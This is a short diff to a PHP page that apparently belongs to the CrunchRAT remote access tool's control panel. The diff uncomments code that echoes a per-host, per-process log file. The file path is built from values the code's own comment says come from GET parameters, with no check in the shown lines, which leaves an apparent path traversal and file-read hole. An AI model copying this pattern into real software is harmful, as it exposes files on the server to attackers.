@@ -1,5 +1,4 @@
 <?php
-    /*
     # Necessary at the top of every page for session management
     session_start();
 
@@ -34,9 +33,8 @@
     $execution_path = $results["executed_out_of"];
 
     # Builds log file path based off "h" and "pid" GET parameters
-    $path = $execution_path . "/logs/" . $hostname . "/" . $process_id . ".log";
-    
+    $path = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";
+
     # Echo's contents of <PID>.log to the screen
     echo file_get_contents($path);
-    */
 ?>
